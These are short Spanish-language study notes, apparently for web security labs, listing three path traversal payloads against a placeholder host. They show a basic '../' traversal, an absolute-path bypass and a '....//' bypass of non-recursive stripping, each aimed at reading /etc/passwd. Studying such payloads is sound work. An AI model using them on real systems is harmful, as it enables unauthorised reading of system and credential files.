En los siguiente ejemplo agrego el  '**item?**' como ejemplo pero no tiene por que llamarse en realidad
## File in URL

	-https://web.com/item?filename=../../etc/passwd

## Bloqueo de rutas absolutas
	-https://web.com/item?filename=/etc/passwd

## Traversal sequences stripped non-recursively
	-https://web.com/item?filaname=....//....//....//etc/passwd
